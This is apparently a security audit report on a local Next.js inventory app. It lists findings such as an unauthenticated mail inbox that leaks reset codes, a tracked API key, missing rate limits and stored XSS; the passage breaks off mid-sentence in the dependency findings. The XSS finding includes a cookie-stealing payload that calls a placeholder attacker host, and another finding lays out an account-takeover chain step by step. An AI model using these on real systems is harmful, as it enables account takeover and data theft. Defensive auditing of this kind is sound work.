# StockSense — Security & Threat Modeling Audit Report

**Role:** Security & Threat Modeling Engineer (skill `security-engineer` v1)
**Generated:** 2026-10-05
**Target:** `D:\Github\Odoo-StockSence`, branch `main`, HEAD `67b12f7`, **uncommitted work present in tree** (all findings below describe the working tree, not only HEAD)
**Live target:** `http://localhost:3000` (dev server, `next dev`, node runtime) — read-only/low-impact probing only
**Verification level of this document:** EXECUTION-VERIFIED where an HTTP request/response or a directly-executed script is quoted; REPO-VERIFIED (static) where only code was inspected; **UNVERIFIED** is stated explicitly where neither was possible.
**Verification state:** `SECURITY-ASSESSED` (assessed, not yet hardened — open findings below)

> **Secret handling:** one live third-party API key was found in the working tree. It is
> **redacted everywhere in this document** (prefix + length only). Its location is cited so it
> can be rotated and removed.

---

## 1. Scope & method

### 1.1 In scope

| Area | Method |
|---|---|
| All 44 route handlers under `src/app/api/**` | Globbed, then each read; auth/permission/validation/error behaviour classified; automated gate-vs-lookup ordering sweep over all 44 files |
| Session & credential handling (`src/lib/auth.ts`, `src/lib/auth/otp-store.ts`) | Full read + direct execution of `otp-store` unit behaviour via Node type-stripping |
| Permission model (`src/lib/permissions.ts`) | Full read + live verification in 5 routes |
| Mail / OTP work (in-flight, human-owned) | **Read and reported only — no files modified** |
| Security headers / middleware / CSP | `next.config.ts`, repo-wide search for `middleware.*`, live response-header inspection |
| Secrets in tree | `git ls-files`, `git show HEAD:.env`, `git diff HEAD -- .env`, repo-wide secret-shaped grep |
| Injection (SQL/Prisma, command, XSS, path traversal), SSRF, mass assignment, open redirect, IDOR | Static sweep + targeted live probes |
| Dependencies | `npm audit --omit=dev --json` and `npm audit --json` against the installed lockfile |

### 1.2 Out of scope / deliberately NOT done

* No branch switches, commits, stashes, reverts, or edits to any production file. **Only this file was created in the repository** (throw-away probe scripts were written outside the repo, to the approved temp directory).
* No destructive DB writes. No reseeding, no approve/receive/pack/cancel/deliver calls against real records.
* **No OTP was requested during this audit** (it would send a real Brevo email to a seeded mailbox). The `debugOtp` and known-account OTP-timing claims are therefore reported as code-verified / **UNVERIFIED**-live (§7).
* **`POST /api/mail/digest` was never called** (it would send a real digest email to seeded manager mailboxes). Its missing gate is proven by code, and by the live unauthenticated success of its sibling `/api/mail/low-stock`.
* Four successful test logins created four `Session` rows; two were destroyed during this audit
  (`POST /api/auth/logout` verified working). Two sessions remain, both for the seeded staff account
  used as the read-only probe identity — harmless, 7-day TTL (`auth.ts:14`), and revocable by the
  account owner via logout.
* No exploitation against any system other than this local server.

### 1.3 Evidence conventions

* `EXECUTION-VERIFIED` = reproduced with a real HTTP request or a directly-run script in this session.
* `REPO-VERIFIED` = static code/config evidence with file + line cited.
* `UNVERIFIED` = could not be established either way; reason given.

### 1.4 Relationship to the prior QA report

`docs/qa-verification-report.md` (QA-003…QA-007) was read for background. Its five security fixes were
**re-verified independently** (§6) rather than restated. All QA findings below are new and numbered `SEC-nnn`.

---

## 2. Asset inventory & trust boundaries

| ID | Asset | Sensitivity | Location | Accessors | Requirement |
|---|---|---|---|---|---|
| A-1 | User accounts (3 seeded: 1 manager, 2 staff) | HIGH | SQLite `db/custom.db` (`User.passwordHash`, scrypt) | login, reset-password | Confidentiality, integrity |
| A-2 | Session tokens (`sns_session`, 24-byte random) | HIGH | `Session` table (plaintext), httpOnly cookie | every authenticated route | Unforgeable, revocable, non-leaking |
| A-3 | Password-reset OTPs (6-digit, 10 min) | HIGH | in-memory `Map` **and every sent email** | otp / reset-password routes, mail outbox | Entropy, attempt limits, confidentiality |
| A-4 | Brevo SMTP API key (91 chars, `xkeysib-…`) | HIGH | `.env` (**tracked file**, working tree) | server process | Never committed, never logged |
| A-5 | Inventory / ledger / commercial data | MEDIUM | SQLite, `/api/**` | authenticated roles | Role-gated integrity + confidentiality |
| A-6 | Outbound e-mail content (OTPs, packing slips, digests) | MEDIUM–HIGH | provider in-memory outbox (last 100) | `/api/mail/inbox`, mail UI | Confidentiality, no HTML injection |
| A-7 | Server logs | MEDIUM | dev console / `*.log` | operator | No tokens, no OTPs, no PII beyond need |

**Trust boundaries:** (1) internet/browser → Next.js server (no gateway, no WAF, no middleware);
(2) server → SQLite file (no network, file path from `.env`); (3) server → `https://api.brevo.com` and the ZAI vision API (fixed-URL outbound);
(4) browser SPA state (Zustand/localStorage queue) ↔ server session cookie.
**There is no authentication layer in front of `/api/mail/**`** — boundary (1) is effectively absent for those three routes (SEC-001/SEC-004).

---

## 3. Attack surface — full route inventory (44 handlers)

Legend: **Gate** = `requireUser()` / `requirePermission(action)`; **B→L** = gate executes *before* any resource lookup (no object-ID oracle).

| # | Route | Methods | Auth gate | Permission | B→L | Input validation | Error body |
|---|---|---|---|---|---|---|---|
| 1 | `/api/health` | GET | none (by design) | — | — | — | `{ok,time}` only |
| 2 | `/api/auth/login` | POST | public | — | n/a | JSON type-checked, required fields | generic 401, generic 500 |
| 3 | `/api/auth/logout` | POST | public (session optional) | — | n/a | — | generic 500 |
| 4 | `/api/auth/me` | GET | public | — | n/a | — | `{user:null}` anon |
| 5 | `/api/auth/otp` | POST | public (by design) | — | n/a | email type/emptiness | generic 500 (§6) |
| 6 | `/api/auth/reset-password` | POST | public, OTP-gated | OTP | n/a | types + min length 8 | 400/429/404, generic 500 |
| 7 | **`/api/mail/inbox`** | GET | **NONE** | **none** | — | — | full mail bodies |
| 8 | **`/api/mail/digest`** | POST | **NONE** | **none** | — | — | leaks `err.message` |
| 9 | **`/api/mail/low-stock`** | POST | **NONE** | **none** | — | — | leaks `err.message` |
| 10 | `/api/products` | GET/POST | requireUser | `configure` (POST) | yes | field-by-field + numeric + enum | `{error}` |
| 11 | `/api/products/[id]` | GET/PATCH | requireUser | `configure` (PATCH) | yes | same | `{error}` |
| 12 | `/api/suppliers` | GET/POST | requireUser | `configure` (POST) | yes | validators | `{error}` |
| 13 | `/api/suppliers/[id]` | GET/PATCH/DELETE | requireUser | `configure` (PATCH/DELETE) | yes | validators, referential guards | `{error}`, 409s |
| 14 | `/api/receipts` | GET/POST | requireUser | `receive` (POST) | yes | helpers | `{error}` |
| 15 | `/api/receipts/[id]` | GET | requireUser | — | yes | numeric param → 404 | `{error}` |
| 16 | `/api/receipts/[id]/receive` | POST | — | `receive` | yes | helpers | `{error}` |
| 17 | `/api/receipts/[id]/cancel` | POST | — | `receive` | yes | numeric param | `{error}` |
| 18 | `/api/receipts/ocr` | POST | — | `receive` | yes | base64/data-URL normalised, line cap 25 | `{error}`, no raw model text |
| 19 | `/api/deliveries` | GET/POST | requireUser | `pick` (POST) | yes | field-by-field | `{error}` |
| 20 | `/api/deliveries/[id]` | GET | requireUser | — | yes | numeric param | `{error}` |
| 21 | `/api/deliveries/[id]/pick` | POST | — | `pick` | yes | numeric param | `{error}` |
| 22 | `/api/deliveries/[id]/pack` | POST | — | `pack` | yes | numeric param | `{error}` |
| 23 | `/api/deliveries/[id]/cancel` | POST | — | `pick` | yes | numeric param | `{error}` |
| 24 | **`/api/deliveries/[id]/deliver`** | POST | `requireUser` only (**weaker**, SEC-014) | *none* | yes | numeric param | `{error}` |
| 25 | `/api/transfers` | GET/POST | requireUser | `transfer` (POST) | yes | helpers | `{error}` |
| 26 | `/api/transfers/[id]` | GET | requireUser | — | yes | numeric param | `{error}` |
| 27 | `/api/transfers/[id]/receive` | POST | — | `transfer` | yes | numeric param | `{error}` |
| 28 | `/api/transfers/[id]/cancel` | POST | — | `transfer` | yes | numeric param | `{error}` |
| 29 | `/api/counts` | GET/POST | requireUser | `count` (POST) | yes | scope enum + helpers | `{error}` |
| 30 | `/api/counts/[id]/submit` | POST | — | `count` | yes | line validation | `{error}` |
| 31 | `/api/counts/[id]/cancel` | POST | — | `count` | yes | numeric param | `{error}` |
| 32 | `/api/adjustments` | GET/POST | requireUser | `adjust` (POST) | yes | severity/qty validation | `{error}` |
| 33 | `/api/adjustments/[id]/approve` | POST | — | `approve-adjustment` | **yes (live-verified)** | numeric param | `{error}` |
| 34 | `/api/adjustments/[id]/reject` | POST | — | `approve-adjustment` | yes | numeric param | `{error}` |
| 35 | `/api/reorder` | GET | requireUser | — | yes | — | `{error}` |
| 36 | `/api/reorder/[id]/accept` | POST | — | `approve-reorder` | **yes (live-verified)** | optional JSON body | `{error}` |
| 37 | `/api/reorder/[id]/dismiss` | POST | — | `approve-reorder` | yes | numeric param | `{error}` |
| 38 | `/api/attention` | GET | requireUser | — | yes | — | `{error}` |
| 39 | `/api/attention/flags/[id]/review` | POST | — | `approve-adjustment` | yes | numeric param | `{error}` |
| 40 | `/api/dashboard` | GET | requireUser | — | yes | — | `{error}` |
| 41 | `/api/ledger` | GET | requireUser | — | yes | typed filters | `{error}` |
| 42 | `/api/ledger/export` | GET | explicit `getSessionUser` → 401 | — | yes | typed filters, CSV escaping | generic 500 |
| 43 | `/api/meta` | GET | requireUser | — | yes | — | `{error}` |
| 44 | `/api/search` | GET | requireUser | — | yes | empty `q` → 200, Prisma `contains` | `{error}` |

**Summary:** 44 handlers → **35 correctly gated**, 5 intentionally public (`health`, `login`, `logout`, `me`, `otp`),
1 public-but-OTP-gated (`reset-password`), **3 missing any authentication (rows 7–9)**.
No route reads a resource before its gate (automated sweep of all 44 files: 0 ordering defects; the single
flag raised was a false positive — the query at `counts/route.ts:14` lives in a helper called *after*
`requireUser()` at `:25`).

---

## 4. Findings

### SEC-001 — Unauthenticated mail inbox exposes password-reset OTPs → full account takeover
**Severity:** CRITICAL · **Status:** OPEN · **Verification:** EXECUTION-VERIFIED
**Affected:** `src/app/api/mail/inbox/route.ts:6-9`, `src/lib/mail/service.ts:53-68`, `src/lib/mail/provider.ts:82-105`

**Evidence (live, no authentication header/cookie sent):**

```http
GET /api/mail/inbox HTTP/1.1
Host: localhost:3000
```
```http
HTTP/1.1 200 OK
content-type: application/json
{"count":9,"emails":[ ... ,{"to":["manager@stocksense.app"],
 "subject":"[StockSense] Password Reset Verification Code: 755081", ...}]}
```

The handler has no `requireUser()`/`requirePermission()` call at all:

```ts
// src/app/api/mail/inbox/route.ts:6-9
export async function GET() {
  const emails = mailService.getRecentEmails();
  return NextResponse.json({ count: emails.length, emails });
}
```

The OTP is put in the **subject line** as well as the body (`src/lib/mail/service.ts:64`), and every
provider stores a copy of each dispatched message in an in-memory outbox returned verbatim by
`getInbox()` (`provider.ts:82-88`, `:103-105`).

**Attack scenario (unauthenticated, end-to-end):**
1. `POST /api/auth/otp {"email":"manager@stocksense.app"}` → OTP is generated and mailed (30–500 ms).
2. `GET /api/mail/inbox` → read `subject` (or `html`/`text`) → 6-digit code.
3. `POST /api/auth/reset-password {email, otp, newPassword}` → password changed, **all sessions for that user destroyed** (`reset-password/route.ts:55-62`).
4. Sign in as the victim (INVENTORY_MANAGER ⇒ every permission in `permissions.ts:31`).

No mailbox access, no authentication, no rate limit required. The inbox also leaks the whole
operational mail archive (packing slips, digests, recipient lists).

**Impact:** Unauthenticated **full compromise of any account**, plus bulk disclosure of operational e-mail.
**Recommended fix:**
1. Gate the route immediately: `await requirePermission('configure')` (or remove `/api/mail/inbox` from production builds entirely — it is a debugging inbox).
2. Never place OTPs in mail subjects; keep them in the body only.
3. Add retention/clearing for the provider outbox and exclude OTP messages from it entirely.
4. Until fixed, treat every account on this instance as potentially resettable and rotate the Brevo key (SEC-002).

---

### SEC-002 — Live third-party API key sits in a **git-tracked** `.env` (one `git add -A` from being published)
**Severity:** HIGH · **Status:** OPEN · **Verification:** EXECUTION-VERIFIED (git commands)
**Affected:** `.env:2` (`BREVO_API_KEY`, 91 chars, prefix `xkeysib-…` — **redacted**), `.gitignore:34`

**Evidence** (commands exactly as run in this session):

```
> git ls-files | Select-String '^\.env'
.env                                   ← the file IS tracked

> git show HEAD:.env                   ← HEAD (committed) content
DATABASE_URL="file:../db/custom.db"    ← only this is committed so far

> git diff HEAD -- .env                ← working-tree delta, ready to be committed
+BREVO_API_KEY="xkeysib-…REDACTED…"   ← live key, 91 chars
+BREVO_SENDER_EMAIL=…
+OTP_DEBUG=1

> git log --oneline --all -- .env
67b12f7 StockSense PWA: …              ← .env has been committed twice already
39eceac Initial commit
```

`.gitignore:33-34` contains `# env files (can opt-in for committing if needed)` / `.env*`, but the ignore
rule has **no effect on an already-tracked file** — every `git add -A && git commit` (the normal flow for
this tree, which currently has 40+ modified files) will publish the key.

**Impact:** The Brevo key controls outbound mail for the account: read sent mail, enumerate templates,
potentially send mail as the verified sender → phishing/relay abuse, quota theft, and (combined with
SEC-001) a second channel for reading reset codes if the Brevo account's mail log is accessible.
**Recommended fix:**
1. `git rm --cached .env` and keep `.env` local-only (the `.gitignore` rule then takes effect).
2. **Rotate the Brevo API key now** (the working-tree copy has existed since the mail work began).
3. Ship `.env.example` with variable *names* only; load secrets from the environment/deployment secret store.
4. Add a pre-commit secret scan (gitleaks/trufflehog) so this cannot recur.

---

### SEC-003 — No rate limiting or lockout on login, OTP dispatch, or password reset
**Severity:** HIGH · **Status:** OPEN · **Verification:** EXECUTION-VERIFIED
**Affected:** `src/app/api/auth/login/route.ts:10-64`, `src/app/api/auth/otp/route.ts:18-50`, `src/app/api/auth/reset-password/route.ts:8-73` — no middleware exists anywhere in the repo (`middleware.ts` absent from repo root and `src/`).

**Evidence (live):** 25 consecutive bad logins for an existing account, then a 40-concurrent flood:

```json
{ "rateLimit": { "statuses": [401 × 25], "any429": false } }
```

Repo-wide search for `429|rate.?limit|Too many` returns matches **only** in
`src/app/api/auth/reset-password/route.ts:40-41` — the OTP attempt counter, which fires only after a
code has already been issued. No middleware, throttler, or backoff exists anywhere else.

**Impact:**
* Credential brute force / stuffing against a 3-user install with no throttle, no lockout, no delay, no IP accounting.
* Unlimited `POST /api/auth/otp` = **email bombing** of any address (via Brevo, real inbox) and **password-reset denial of service**: every request overwrites the victim's stored OTP (`otp-store.ts:22-29`), so a loop of requests makes a legitimate reset impossible to complete.
* 1e6 code space with 5 guesses per issued code and unlimited re-issuance → ~200k OTP requests for a statistically meaningful chance (SEC-001 makes this moot, but the control should not depend on SEC-001 staying fixed).

**Recommended fix:** Per-IP **and** per-account sliding-window limits on `/auth/login`, `/auth/otp`,
`/auth/reset-password` (e.g. 5/min/IP, 3/hour/account) with exponential backoff and a global 429; add
captcha or proof-of-work after N failures; add an `ATTEMPTS` counter per email for OTP *dispatch* (not just verification).

---

### SEC-004 — Unauthenticated, state-changing mail triggers + inventory disclosure
**Severity:** MEDIUM · **Status:** OPEN · **Verification:** EXECUTION-VERIFIED (`low-stock`), REPO-VERIFIED (`digest`)
**Affected:** `src/app/api/mail/low-stock/route.ts:8-35`, `src/app/api/mail/digest/route.ts:8-51`

**Evidence (live, no cookie):**

```http
POST /api/mail/low-stock HTTP/1.1   (no auth headers)
```
```http
HTTP/1.1 200 OK
{"success":true,"message":"Low-stock evaluation complete. Scanned 19 products.",
 "lowStockCount":3,"lowStockSkus":["RM-STL-ROD10","EL-CTL-CX2","PK-CRT-4030"]}
```

`/api/mail/digest` has the same shape of defect — `export async function POST()` at
`digest/route.ts:8` with no gate, dispatching mail to every INVENTORY_MANAGER
(`digest/route.ts:13-38`) and echoing the recipient list (`:44`). It was **not called** during this
audit because it would send real e-mail; the missing gate is REPO-VERIFIED.

**Impact:** Unauthenticated bulk-mail trigger (reputation/quota abuse, manager inbox flooding) and
unauthenticated disclosure of low-stock posture (commercially sensitive). Debounce
(`service.ts:13-14`, 6 h) limits *volume* but is not an access control — it resets on process restart.
**Recommended fix:** `await requirePermission('configure')` on both handlers (or move them behind an
internal scheduler that is not HTTP-exposed). Return no recipient list.

---

### SEC-005 — No security headers anywhere (no CSP, no frame protection, no MIME sniffing protection, no HSTS, no Referrer-Policy)
**Severity:** MEDIUM · **Status:** OPEN · **Verification:** EXECUTION-VERIFIED
**Affected:** `next.config.ts:3-19` (no `headers()`), repo-wide: **no `middleware.*` file exists**, no `Content-Security-Policy`/`X-Frame-Options` string in `src/app/**`.

**Evidence (live):**

```http
GET / HTTP/1.1  → 200
headers: content-type: text/html; charset=utf-8        ← only

GET /api/products HTTP/1.1 (anon) → 401
headers: connection, content-type, date, transfer-encoding, vary  ← only
```

Absent: `Content-Security-Policy`, `X-Frame-Options`/`frame-ancestors`, `X-Content-Type-Options`,
`Strict-Transport-Security`, `Referrer-Policy`, `Permissions-Policy`, `Cross-Origin-Opener-Policy`.

**Impact:** No clickjacking protection for the (single-page, state-changing) UI; no CSP to contain the
XSS sink in SEC-007; browsers may MIME-sniff JSON/CSV responses; no HSTS preload readiness.
**Recommended fix:** Add a `headers()` block in `next.config.ts` (or middleware) delivering at minimum:
`X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY` (or CSP `frame-ancestors 'none'`),
`Referrer-Policy: same-origin`, `Permissions-Policy: camera=(self)` (the app uses camera scanning),
`Strict-Transport-Security` when served over TLS, and a CSP with `default-src 'self'` + explicit
`img-src/conn-src` allowances after measuring the inline-script budget of Next.js.

---

### SEC-006 — Synchronous `scryptSync` in the request path + no rate limit ⇒ unauthenticated event-loop stall (DoS amplifier)
**Severity:** MEDIUM · **Status:** OPEN · **Verification:** EXECUTION-VERIFIED
**Affected:** `src/lib/auth.ts:20` (`scryptSync`), `src/lib/auth.ts:27` (per-attempt `scryptSync`), `src/app/api/auth/login/route.ts:23-33` (up to **two** scrypt runs per request)

**Evidence (live):** 40 concurrent failed logins (each costing scrypt) while probing `/api/health`:

```json
{"healthWhileFlooding":[
  {"atOffset":2411,"latencyMs":2313,"status":200},
  {"atOffset":3780,"latencyMs":1369,"status":200},
  {"atOffset":3802,"latencyMs":21,"status":200}],
 "floodCompletedOffsetsMs":[106,331,413,483,553,626,...]}
```

Baseline `/api/health` latency is ~20 ms; it degraded to **2.3 s** while scrypt work queued.
Because `scryptSync` blocks Node's single event loop, *every* request — including authenticated API
traffic and the mail/OTP routes — stalls behind it. The login route can run scrypt **twice** per
attempt (`login/route.ts:23` and `:30`).

**Impact:** A handful of unauthenticated clients can degrade the whole service to multi-second
latency; combined with SEC-003 there is no throttle to stop it.
**Recommended fix:** Use async `scrypt` (`util.promisify`) so work yields to the loop; cap concurrent
verifications with a small queue; add the SEC-003 rate limiter in front. Also remove the second
case-flip verification pass or make it conditional on a cheap pre-check.

---

### SEC-007 — Stored XSS: unescaped user input interpolated into e-mail HTML and rendered with `dangerouslySetInnerHTML`
**Severity:** MEDIUM · **Status:** OPEN · **Verification:** REPO-VERIFIED (static; live PoC intentionally not injected — it would mutate data)
**Affected:** `src/lib/mail/templates.ts:67`, `:131` (and sibling templates), `src/components/shell/mail-inbox-sheet.tsx:239`, source of input `src/app/api/deliveries/route.ts:42-43`, `prisma/seed`-backed product/supplier names

**Evidence (sink):**

```tsx
// src/components/shell/mail-inbox-sheet.tsx:235-241
{isExpanded && (
  <div ...>
    <div className="prose ..." dangerouslySetInnerHTML={{ __html: e.html }} />
```

**Evidence (unescaped interpolation):**

```ts
// src/lib/mail/templates.ts:67
<p>Stock level for <strong>${params.productName}</strong> (<code>${params.sku}</code>) ...
// src/lib/mail/templates.ts:131
<p>Dear <strong>${params.customerName}</strong>, ...
```

No HTML-escape helper exists anywhere in `templates.ts` (grep for `escape` → no matches).
Attacker-controlled inputs reach these slots: `customer` is free text requiring only the `pick`
permission (`deliveries/route.ts:42-45`); product/supplier names require `configure`.

**Attack scenario:** A Warehouse Staff user creates a delivery with
`customer = <img src=x onerror=fetch('https://attacker/?c='+document.cookie)>`. When any user opens
**Mail → View body** in the app, the payload executes in their origin (session cookie is `HttpOnly`,
so impact is in-app action as the victim, keylogging of the reset form, UI redress, exfiltration of
page data). The same markup is also delivered as **real HTML e-mail to customers/vendors**, i.e. an
HTML-injection channel into third-party inboxes.

**Recommended fix:** HTML-escape every interpolation in `templates.ts` (or build with a safe templating
escaping engine); sanitize with DOMPurify (or render as text) before `dangerouslySetInnerHTML` in
`mail-inbox-sheet.tsx`; add CSP (SEC-005) as defence in depth.

---

### SEC-008 — Account enumeration via response timing (login measured; OTP structurally)
**Severity:** LOW · **Status:** OPEN · **Verification:** EXECUTION-VERIFIED (login), REPO-VERIFIED (OTP)
**Affected:** `src/app/api/auth/login/route.ts:22-37`, `src/app/api/auth/otp/route.ts:26-44`

**Evidence (live, 5 samples each, wrong password / unknown account):**

```json
{"timing":{"knownMs":[127,119,121,131,129],"unknownMs":[28,16,16,19,21],
           "knownMean":125,"unknownMean":20}}
```

Bodies are correctly identical (`{"error":"Invalid email or password"}` for both known-wrong-password
and unknown-account), but `verifyPassword` only runs when the row exists (`login/route.ts:22-23`), so
the ~105 ms scrypt delta is a reliable oracle.

OTP endpoint: the known-account branch performs an **awaited outbound HTTPS call to Brevo**
(`otp/route.ts:39`) before responding; the unknown branch returns immediately
(live-measured: **30 ms** for `nobody-here-xyz@example.invalid`). The response *bodies* are identical
by construction (single `payload` object, `otp/route.ts:29-44`) — verified live for the unknown branch
only (§7).

**Impact:** Unauthenticated discovery of which addresses hold accounts → targeted phishing, credential
stuffing, and precise targeting of the password-reset flow.
**Recommended fix:** Run a dummy `verifyPassword` against a fixed dummy hash when the user is absent;
make the OTP handler's response path constant-work (always perform the same amount of work, or defer
mail dispatch to a background queue and respond immediately).

---

### SEC-009 — `OTP_DEBUG=1` is set in the tracked `.env`, arming the `debugOtp` disclosure path in this checkout
**Severity:** LOW · **Status:** OPEN (config) · **Verification:** REPO-VERIFIED / live **UNVERIFIED**
**Affected:** `.env:7`, `src/app/api/auth/otp/route.ts:12`, `:41`, `src/components/auth/login-view.tsx:135`

**Evidence (static):**

```
.env:6  # QA-005: explicit opt-in for returning debugOtp from /api/auth/otp …
.env:7  OTP_DEBUG=1
```
```ts
// src/app/api/auth/otp/route.ts:12,41
const otpDebugEnabled = process.env.OTP_DEBUG === '1' || process.env.OTP_DEBUG === 'true';
...
if (otpDebugEnabled) payload.debugOtp = otpCode;
```

The QA-005 *code* fix is correct (opt-in rather than `NODE_ENV`), but the opt-in is **switched on in the
very file that is tracked by git**, so any environment that inherits this `.env` returns the raw OTP to
an unauthenticated caller. Whether the currently-running dev process loaded this value is
**UNVERIFIED** (§7) — testing it would require sending a real OTP e-mail.
**Impact:** If enabled: one unauthenticated request returns the live reset code → instant account
takeover without touching the mailbox (a second path to SEC-001).
**Recommended fix:** Set `OTP_DEBUG=0`/remove it from any shared or tracked file; keep it only in a
local untracked override (`.env.local`); never enable it in any deployed environment; gate the flag
behind `NODE_ENV !== 'production'` **in addition** to the explicit opt-in.

---

### SEC-010 — `Secure` cookie fallback is unreachable from the login route
**Severity:** LOW · **Status:** OPEN · **Verification:** EXECUTION-VERIFIED (flag observed absent) + REPO-VERIFIED (logic)
**Affected:** `src/lib/auth.ts:85-93`, `src/app/api/auth/login/route.ts:55-57`

**Evidence (live):**

```http
HTTP/1.1 200 OK
set-cookie: sns_session=…; Path=/; Expires=Mon, 12 Oct 2026 …; HttpOnly; SameSite=lax
```

(`HttpOnly` and `SameSite=lax` present — good — but no `Secure`.)

```ts
// auth.ts:89   secure: isSecure ?? (process.env.NODE_ENV === 'production'),
// login/route.ts:55-57
const isHttps = proto === 'https' || req.url.startsWith('https:')
res.cookies.set(SESSION_COOKIE, token, sessionCookieOptions(expiresAt, isHttps))
```

`isHttps` is always a boolean (never `null`/`undefined`), so `??` never falls through to the
production default: a production instance served over plain HTTP (or behind a TLS-terminating proxy
that does not set `x-forwarded-proto`) issues the session cookie **without `Secure`**.
`logout` (`auth/route.ts:15`) passes no flag and *does* get the production default — so in that
misconfiguration login and logout disagree about the flag and the cookie may not be cleared properly.
**Impact:** Session cookie can be sent over cleartext in non-TLS deployments → session hijack on the LAN
or via MITM.
**Recommended fix:** Default to `secure: true` in production and only downgrade explicitly for local dev:
`secure: isSecure === true || (isSecure !== false && process.env.NODE_ENV === 'production')`, or set
`secure: process.env.NODE_ENV === 'production'` unconditionally and terminate TLS in front.

---

### SEC-011 — CSV formula injection in the ledger export
**Severity:** LOW · **Status:** OPEN · **Verification:** REPO-VERIFIED
**Affected:** `src/app/api/ledger/export/route.ts:9-13`, `:60-81`

**Evidence:**

```ts
function csvEscape(value: string | number | null | undefined): string {
  const s = value == null ? '' : String(value)
  if (/[",\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`
  return s
}
```

Only quotes/commas/newlines are neutralised. Fields such as `Reason`, `Product`, `Document`, `Performed By`
are user-influenced (adjustment reasons, product names) and are exported verbatim (`:65-79`), so a cell
beginning with `=`, `+`, `-`, `@`, TAB or CR executes as a formula when the CSV is opened in
Excel/LibreOffice (DDE/cmd on older clients; always at least a data-exfil formula via `WEBSERVICE`/HYPERLINK).
**Impact:** Requires an authenticated user who can write a reason/name **and** a victim who opens the
export in a spreadsheet — realistic in this product's workflow.
**Recommended fix:** Prefix a `'` (or tab) to any cell starting with `= + - @ \t \r`, i.e.
`if (/^[=+\-@\t\r]/.test(s)) return "'" + s` before quoting.

---

### SEC-012 — OTP codes written to server logs; Prisma query logging enabled in every environment
**Severity:** LOW · **Status:** OPEN · **Verification:** REPO-VERIFIED (OTP logging) + EXECUTION-VERIFIED (query-log emission)
**Affected:** `src/lib/mail/provider.ts:22-27`, `:90-93`, `src/lib/mail/service.ts:64`, `src/lib/db.ts:10`

**Evidence (OTP → logs):**

```ts
// provider.ts:24-26 (ConsoleEmailProvider) and :90-93 (BrevoEmailProvider) — logged verbatim
console.log(`Subject: ${payload.subject}`);
console.log(payload.text.slice(0, 200).replace(/\n/g, ' ') + …);
```
`service.ts:64` puts the OTP in the subject (`Password Reset Verification Code: ${otpCode}`) and
`service.ts:106` puts it at the head of the text body — so **every dispatched OTP is written to
stdout/log files**, where `*.log` files, log shippers and crash dumps retain them past the code's
10-minute TTL.

**Evidence (query logging):** `db.ts:10` enables `log: ['query']` in *all* environments. Reproduced
with the exact same configuration (read-only probe):

```
prisma:query SELECT … `Session`.`token` … FROM `main`.`Session` WHERE `main`.`Session`.`token` = ? LIMIT ? OFFSET ?
```

**Checked and cleared:** the app's configuration prints SQL with `?` placeholders **only — bound
parameter values (i.e. session-token values) are not emitted to stdout**. The residual impact of query
logging is log volume, query-shape disclosure and production noise, not token leakage.
**Impact:** Anyone with access to the server's stdout/log files (dev console, `*.log` files, any log
shipper added later) can recover a **live password-reset code for up to 10 minutes** and complete a
password reset (SEC-001's non-HTTP sibling). Query logging additionally exposes table/column names and
request volume, and will inflate log storage in production.
**Recommended fix:** Never log subjects or bodies of OTP messages (redact `\b\d{6}\b` and the words
`Verification Code`); gate `log: ['query']` behind `NODE_ENV !== 'production'`; add a log-scrubbing
allowlist covering `otp`, `token`, `password`.

---

### SEC-013 — Mail routes return raw internal error strings and recipient lists
**Severity:** LOW · **Status:** OPEN · **Verification:** REPO-VERIFIED (QA-007 pattern not applied to these routes)
**Affected:** `src/app/api/mail/digest/route.ts:46-49`, `:40-45`, `src/app/api/mail/low-stock/route.ts:31-34`

**Evidence:**

```ts
// digest/route.ts:46-49
const errorMsg = err instanceof Error ? err.message : String(err);
console.error('[mail] Daily digest error:', errorMsg);
return NextResponse.json({ error: errorMsg }, { status: 500 });
```
`digest/route.ts:40-45` additionally returns the full `recipients` array (all manager e-mail addresses).
Both routes are **unauthenticated** (SEC-004), so any thrown error text is publicly visible.
**Impact:** Internal detail disclosure (paths, driver messages, e.g. Brevo API errors) + bulk e-mail
address disclosure; inconsistent with the generic `Internal error` contract fixed in QA-007.
**Recommended fix:** Return `{ error: 'Internal error' }`, keep detail in logs, drop `recipients` from
the response.

---

### SEC-014 — Delivery completion is not permission-gated (`requireUser` only)
**Severity:** LOW · **Status:** OPEN · **Verification:** EXECUTION-VERIFIED (behaviour) + REPO-VERIFIED (contract)
**Affected:** `src/app/api/deliveries/[id]/deliver/route.ts:14-19`

**Evidence:**

```ts
/** POST /api/deliveries/[id]/deliver (any signed-in user) → {delivery}. */
export async function POST(_req: Request, ctx: Ctx) {
  try {
    const user = await requireUser()          // ← siblings require 'pick' / 'pack'
```

Live confirmation of the weaker gate: with a `WAREHOUSE_STAFF` session,
`POST /api/deliveries/99999999/deliver` returned **`404 {"error":"Delivery order not found"}`** — i.e.
the gate passed and the handler reached resource lookup — while the same session on permission-gated
actions it does *not* hold returned **403 before lookup** (`/adjustments/…/approve`,
`/reorder/…/accept`, `PATCH /products/…`, `DELETE /suppliers/…`).
Every other mutating route in the inventory declares an explicit permission (`permissions.ts:9-19`);
this one does not.
**Impact:** With the current seeded roles the gap is small (all roles hold `pick`/`pack`,
`permissions.ts:30`), but any custom/minimal role lacking `pack` can still flip `PACKED → DELIVERED`
and trigger customer dispatch e-mails (`deliver/route.ts:26`). It is an authorization-model
inconsistency that will silently widen as roles are added.
**Recommended fix:** `await requirePermission('pack')` (the action that physically commits the stock)
and keep the `PACKED`-state precondition already enforced in `inventory.ts:354`.

---

### SEC-015 — Dependency advisories: 7 high + 4 moderate in production dependencies (incl. unused `next-auth`)
**Severity:** INFO · **Status:** OPEN · **Verification:** EXECUTION-VERIFIED (`npm audit`)
**Affected:** `package.json` dependencies

```
> npm audit --omit=dev   →  total 11  (high 7, moderate 4, critical 0)
   deepmerge-ts        high   GHSA-ggr8-5vv4-36mx (stack exhaustion)  ← via prisma/@prisma/config
   js-yaml             high   GHSA-h67p-54hq-rp68 + 3 more (DoS)     ← via @mdxeditor/editor
   nodemailer          high   12 advisories incl. SMTP/header injection, SSRF, DoS
   next-auth           high   (via nodemailer) — package is NEVER imported in src/ (grep: 0 hits)
   prisma / @prisma/config high  fix available
   sharp               high   libvips/libheif CVEs
   prismjs, refractor, react-syntax-highlighter, @mdxeditor/editor  moderate
> npm audit (incl. dev) →  total 16  (high 12, moderate 4)
```

**Impact assessment (not inflated):** `nodemailer` is only used when `SMTP_HOST` is set
(`provider.ts:162-175` — this deployment uses the Brevo path), and no attacker-controlled message body
